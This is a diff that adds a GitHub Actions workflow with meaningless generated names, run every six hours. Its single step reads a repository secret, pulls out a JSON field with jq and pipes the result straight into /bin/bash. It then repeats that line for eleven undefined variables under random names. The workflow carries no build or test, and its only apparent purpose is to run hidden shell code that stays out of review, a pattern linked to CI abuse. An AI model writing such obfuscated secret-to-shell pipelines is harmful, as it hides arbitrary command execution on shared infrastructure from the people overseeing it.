@@ -1,0 +1,29 @@
+name: shanxiaochen8371
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '18 0/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: shanxiaochen8371
+        env:
+          eb1108: ${{ secrets.eb1108 }}
+        run: |
+          echo $eb1108 | jq -r .fma5027 | /bin/bash
+          echo $r33725 | jq -r .kd93465 | /bin/bash
+          echo $s17180 | jq -r .b641 | /bin/bash
+          echo $dlfp57872 | jq -r .tsm5 | /bin/bash
+          echo $gf1025 | jq -r .fmc7 | /bin/bash
+          echo $uxt9343 | jq -r .yyoqw62 | /bin/bash
+          echo $w41430 | jq -r .ahqsd926 | /bin/bash
+          echo $sku4 | jq -r .sf8764 | /bin/bash
+          echo $ib8079 | jq -r .t674 | /bin/bash
+          echo $ztqet33709 | jq -r .aktul54021 | /bin/bash
+          echo $qk88 | jq -r .fx7 | /bin/bash
+          echo $kfptw375 | jq -r .o195 | /bin/bash
+
